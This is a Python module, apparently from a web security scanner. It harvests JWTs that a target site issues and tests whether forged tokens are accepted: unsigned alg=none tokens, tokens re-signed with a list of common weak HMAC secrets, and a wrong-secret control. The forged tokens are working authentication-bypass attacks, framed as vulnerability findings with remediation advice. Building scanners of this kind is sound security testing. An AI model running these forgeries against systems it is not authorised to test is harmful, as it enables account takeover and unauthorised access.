"""JWT attacks -- the jwt-cracker persona (alg:none, weak HMAC, kid hints).

The module hunts JSON Web Tokens the target itself issued during the scan
(session cookies, page content, JS blobs) and attacks *only those tokens*
-- it never brute-forces logins. Three checks per token, each with its
own control request:

1. **alg=none confusion** -- re-sign the payload with ``{"alg":"none"}``
   and an empty signature. If the server accepts it (differential against
   the original token's response), signature verification is off.
2. **Weak HMAC secret** -- re-sign the *same payload* with a handful of
   common secrets. Acceptance proves the signing secret (or that no
   verification happens -- distinguished by check 3's control).
3. **Unsigned-token control** -- a token signed with a deliberately wrong
   secret. If THIS is also accepted, the server ignores signatures
   entirely (worse, and honest reporting demands the distinction).

Additional passive observations: tokens with an empty signature segment
(alg=none in the wild) and ``kid`` header parameters (path-traversal /
SQL-injection candidates per the classic kid attacks -- reported as
tentative advisories, never actively weaponised).

Request budget: at most 3 tokens x 4 requests (baseline + 3 forgeries).
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re

from ...models import Category, Finding, Severity
from ..base import Module, ScanContext, register

JWT_RE = re.compile(r"(eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*)")

WEAK_SECRETS = [
    "secret", "password", "jwt_secret", "changeme", "dev", "test",
    "key", "supersecret", "admin", "your-256-bit-secret", "shhhh",
]

SESSION_COOKIE_RE = re.compile(r"(session|sess|auth|token|jwt|id)", re.IGNORECASE)
MAX_TOKENS = 3
MAX_PAGES = 8


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def decode_jwt(token: str) -> tuple[dict, dict] | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload
    except Exception:  # noqa: BLE001 -- malformed tokens are skipped
        return None


def sign_jwt(header: dict, payload: dict, secret: str, alg: str = "HS256") -> str:
    header = dict(header)
    header["alg"] = alg
    signing_input = f"{_b64url_encode(json.dumps(header).encode())}.{_b64url_encode(json.dumps(payload).encode())}"
    if alg == "none":
        return f"{signing_input}."
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
    sig = hmac.new(secret.encode(), signing_input.encode(), digest).digest()
    return f"{signing_input}.{_b64url_encode(sig)}"


def _harvest_tokens(ctx: ScanContext) -> list[tuple[str, str, str]]:
    """Collect (token, url, source) triples the target itself gave us."""
    found: list[tuple[str, str]] = []
    seen: set[str] = set()

    for name, value in ctx.client.jar_cookies().items():
        if value and JWT_RE.search(value):
            tok = JWT_RE.search(value).group(1)
            if tok not in seen:
                seen.add(tok)
                found.append((tok, f"cookie:{name}", ctx.base_url))

    pages = ctx.urls[:MAX_PAGES] if ctx.urls else [ctx.base_url]

    async def _scan_pages():
        for url in pages:
            if len(found) >= MAX_TOKENS * 3:
                break
            r = await ctx.client.get(url)
            if not r.ok:
                continue
            for m in JWT_RE.finditer(r.text):
                tok = m.group(1)
                if tok not in seen:
                    seen.add(tok)
                    found.append((tok, "page content", url))
            if len(found) >= MAX_TOKENS:
                break

    return found, _scan_pages


@register
class JwtAttacksModule(Module):
    name = "jwt-attacks"
    categories = [Category.CRYPTO]
    passive = False
    aggressive_required = True

    async def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        found, scan_pages = _harvest_tokens(ctx)
        await scan_pages()

        for token, source, url in found[:MAX_TOKENS]:
            decoded = decode_jwt(token)
            if not decoded:
                continue
            header, payload = decoded
            alg = str(header.get("alg", "")).upper()

            # Passive observation 1: token itself is unsigned.
            if token.split(".")[2] == "":
                findings.append(
                    Finding(
                        category=Category.CRYPTO,
                        title=f"JWT with empty signature (alg={alg or 'none'}) accepted into use",
                        severity=Severity.HIGH,
                        confidence="confirmed",
                        url=url,
                        description="The target issued/uses a JWT with an empty signature segment.",
                        evidence=f"token: {token[:80]}... header={header}",
                        remediation="Reject tokens without signatures; enforce a strict allowlist of algorithms server-side.",
                        cwe="CWE-327",
                        module=self.name,
                        verified=True,
                    )
                )
                continue

            # Active attacks only make sense for HMAC tokens.
            if alg not in {"HS256", "HS384", "HS512"}:
                if header.get("kid"):
                    findings.append(
                        Finding(
                            category=Category.CRYPTO,
                            title=f"JWT uses 'kid' header (kid-injection candidate) [{source}]",
                            severity=Severity.LOW,
                            confidence="tentative",
                            url=url,
                            description=(
                                f"The token's kid={header.get('kid')!r} selects verification keys. "
                                "kid path-traversal/SQLi attacks may apply -- manual verification required."
                            ),
                            evidence=f"header={header}",
                            remediation="Validate kid against a strict allowlist; never pass it to file paths or SQL.",
                            cwe="CWE-347",
                            module=self.name,
                            verified=False,
                        )
                    )
                continue

            # ----------------------------------------------------------------
            # Differential acceptance harness -- FP-safe by construction.
            #
            # A forgery "counts as accepted" only on a page that actually
            # VALIDATES the token: first we hunt for a validating page (the
            # original token is accepted there AND a wrong-secret forgery is
            # rejected). If no crawled page validates signatures, active
            # attacks are meaningless -- we honestly skip instead of
            # mislabeling auth-free pages as bypasses.
            # ----------------------------------------------------------------
            async def _accepted_at(forged: str, at: str, src: str) -> tuple[bool, str]:
                if src.startswith("cookie:"):
                    cookie_name = src.split(":", 1)[1]
                    with ctx.client.cookie_override(cookie_name, forged):
                        r = await ctx.client.get(at if "://" in at else ctx.base_url)
                else:
                    r = await ctx.client.get(at if "://" in at else ctx.base_url)
                if not r.ok:
                    return False, f"request failed: {r.error}"
                if r.status in (401, 403):
                    return False, f"rejected (HTTP {r.status})"
                low = r.text.lower()
                if "sign in" in low and "welcome" not in low:
                    return False, "redirected to login"
                return True, f"HTTP {r.status}, {len(r.text)} bytes returned"

            candidate_pages: list[str] = []
            for cand in ([url] if "://" in url else []) + list(ctx.urls) + [ctx.base_url]:
                if cand and cand not in candidate_pages:
                    candidate_pages.append(cand)
            # Auth/session-relevant pages first -- they are where a token is
            # actually validated (login views, account pages, JWT endpoints).
            candidate_pages.sort(
                key=lambda u: 0
                if re.search(r"(login|log-?in|jwt|auth|session|account|profile|me|dashboard)", u, re.I)
                else 1
            )

            validating_page: str | None = None
            baseline_note = control_note = ""
            bad = sign_jwt(header, payload, "bughound-invalid-secret-xyz", alg)
            for at in candidate_pages[:8]:
                base_ok, base_note = await _accepted_at(token, at, source)
                if not base_ok:
                    continue  # token not honoured here
                bad_ok, bad_note = await _accepted_at(bad, at, source)
                if not bad_ok:
                    # This page distinguishes valid from invalid tokens: attacks
                    # here are meaningful and the control behaves as physics demands.
                    validating_page = at
                    baseline_note, control_note = base_note, bad_note
                    break
                # The page accepts any signature -- indistinguishable from a
                # page that never checks auth, so we keep hunting; if no page
                # ever validates, we honestly report nothing.

            if validating_page is None:
                # Either the token is expired everywhere or no page validates
                # signatures -- no honest active claim is possible.
                continue

            url = validating_page

            # alg=none confusion.
            none_tok = sign_jwt(header, payload, "", "none")
            none_ok, none_note = await _accepted_at(none_tok, url, source)
            if none_ok:
                findings.append(
                    Finding(
                        category=Category.CRYPTO,
                        title=f"JWT alg=none confusion accepted [{source}]",
                        severity=Severity.CRITICAL,
                        confidence="confirmed",
                        url=url,
                        description="The server accepts an unsigned (alg=none) variant of its own token.",
                        evidence=(
                            f"baseline accepted on {url} ({baseline_note}); alg=none forgery accepted "
                            f"({none_note}); wrong-secret control correctly rejected ({control_note})"
                        ),
                        remediation="Reject alg=none; pin allowed algorithms and keys.",
                        cwe="CWE-347",
                        module=self.name,
                        verified=True,
                    )
                )
                continue

            # Weak HMAC secret.
            weak_hit: tuple[str, str] | None = None
            for cand in WEAK_SECRETS:
                forged = sign_jwt(header, payload, cand, alg)
                ok, note = await _accepted_at(forged, url, source)
                if ok:
                    weak_hit = (cand, note)
                    break
            if weak_hit:
                secret, note = weak_hit
                findings.append(
                    Finding(
                        category=Category.CRYPTO,
                        title=f"JWT signed with a guessable HMAC secret ({secret!r}) [{source}]",
                        severity=Severity.CRITICAL,
                        confidence="confirmed",
                        url=url,
                        description=(
                            f"The application's HMAC signing secret is the common string "
                            f"{secret!r}: tokens can be minted with arbitrary claims offline."
                        ),
                        evidence=(
                            f"token re-signed with {secret!r} was accepted on {url} ({note}); "
                            "wrong-secret control was correctly rejected -- the secret is real"
                        ),
                        remediation="Use a long random secret; rotate; pin algorithms.",
                        cwe="CWE-321",
                        module=self.name,
                        verified=True,
                    )
                )
        return findings
